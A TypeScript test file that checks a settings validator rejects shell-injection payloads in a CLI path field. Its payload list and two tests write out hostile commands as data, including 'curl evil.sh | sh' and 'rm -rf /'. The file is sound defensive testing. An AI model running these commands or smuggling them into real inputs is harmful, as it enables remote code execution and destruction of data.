import { describe, it, expect, afterEach } from 'vitest';
import { mkdtempSync, rmSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { validateObsidianCliPathSetting } from './contracts.js';
import { parseSettingsForm } from './form.js';
import { saveSettings } from './io.js';

// Bead lget/w3pj: obsidianCliPath is admin-mutable through the settings form
// and is later handed to a process spawn. It must never be able to carry a
// shell-injection payload. These tests pin the config-write boundary defence.

const INJECTION_PAYLOADS = [
  'obsidian; curl evil.sh | sh',
  'obsidian && rm -rf /',
  '$(reboot)',
  '`id`',
  'obsidian $(whoami)',
  'obsidian\nmalicious',
  'obsidian cli', // whitespace
  "obsidian'; touch pwned; '",
];

describe('validateObsidianCliPathSetting', () => {
  it('accepts a bare command name', () => {
    expect(validateObsidianCliPathSetting('obsidian')).toBe('obsidian');
  });

  it('accepts an absolute path', () => {
    expect(validateObsidianCliPathSetting('/usr/local/bin/obsidian-cli'))
      .toBe('/usr/local/bin/obsidian-cli');
  });

  it('rejects every shell-injection payload', () => {
    for (const bad of INJECTION_PAYLOADS) {
      expect(() => validateObsidianCliPathSetting(bad)).toThrow();
    }
  });

  it('rejects a relative path (must be absolute or bare name)', () => {
    expect(() => validateObsidianCliPathSetting('./obsidian'))
      .toThrow(/absolute path or a bare command name/);
    expect(() => validateObsidianCliPathSetting('bin/obsidian'))
      .toThrow(/absolute path or a bare command name/);
  });

  it('rejects empty', () => {
    expect(() => validateObsidianCliPathSetting('')).toThrow(/non-empty/);
  });
});

describe('parseSettingsForm — obsidianCliPath', () => {
  it('accepts a safe cliPath', () => {
    const [settings, errors] = parseSettingsForm(
      new URLSearchParams({ obsidianCliPath: '/opt/obsidian' }),
    );
    expect(errors).toEqual([]);
    expect(settings.obsidianCliPath).toBe('/opt/obsidian');
  });

  it('rejects an injection payload and does not set the field', () => {
    const [settings, errors] = parseSettingsForm(
      new URLSearchParams({ obsidianCliPath: 'obsidian; curl evil.sh | sh' }),
    );
    expect(errors.length).toBeGreaterThan(0);
    expect(errors.some((e) => e.includes('obsidianCliPath'))).toBe(true);
    expect(settings.obsidianCliPath).toBeUndefined();
  });
});

describe('saveSettings — obsidianCliPath', () => {
  let dir: string;

  afterEach(() => {
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  it('refuses to persist an injection payload', () => {
    dir = mkdtempSync(join(tmpdir(), 'psfn-settings-'));
    expect(() => saveSettings(dir, { obsidianCliPath: 'obsidian && rm -rf /' }))
      .toThrow(/obsidianCliPath/);
  });

  it('persists a safe cliPath', () => {
    dir = mkdtempSync(join(tmpdir(), 'psfn-settings-'));
    saveSettings(dir, { obsidianCliPath: '/usr/bin/obsidian' });
    const written = JSON.parse(readFileSync(join(dir, 'settings.json'), 'utf-8'));
    expect(written.obsidianCliPath).toBe('/usr/bin/obsidian');
  });
});
